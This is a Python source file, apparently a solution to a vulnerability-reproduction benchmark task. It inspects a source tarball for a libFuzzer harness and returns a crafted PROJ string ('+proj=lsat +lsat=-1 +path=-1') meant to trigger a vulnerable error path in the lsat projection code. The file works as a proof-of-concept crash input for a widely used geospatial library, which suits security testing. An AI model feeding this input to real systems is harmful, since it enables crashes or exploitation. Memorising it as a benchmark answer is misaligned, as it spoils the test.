import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        harness_type = self._detect_harness_type(src_path)
        if harness_type == "crs_to_crs":
            # Two-input harness: source CRS newline target CRS
            # Source triggers the vulnerable lsat projection error path
            # Target is a benign CRS
            return b"+proj=lsat +lsat=-1 +path=-1\n+proj=latlong"
        else:
            # Single-input harness: just create the lsat projection with invalid params to hit error path
            return b"+proj=lsat +lsat=-1 +path=-1"

    def _detect_harness_type(self, src_path: str) -> str:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                # Scan source files for fuzzer harness patterns
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith((".cc", ".cpp", ".c", ".cxx", ".h", ".hpp", ".hh", ".hxx")):
                        continue
                    # Read a limited amount to be efficient
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read(512000)
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue

                    if "llvmfuzzertestoneinput" not in text.lower():
                        continue

                    # Prefer specific detection if present in the harness file
                    if re.search(r'\bproj_create_crs_to_crs\s*\(', text):
                        return "crs_to_crs"
                    if re.search(r'\bpj_init_plus\s*\(', text):
                        return "single"
                    if re.search(r'\bproj_create\s*\(', text):
                        return "single"
        except Exception:
            pass
        # Default to single-input harness
        return "single"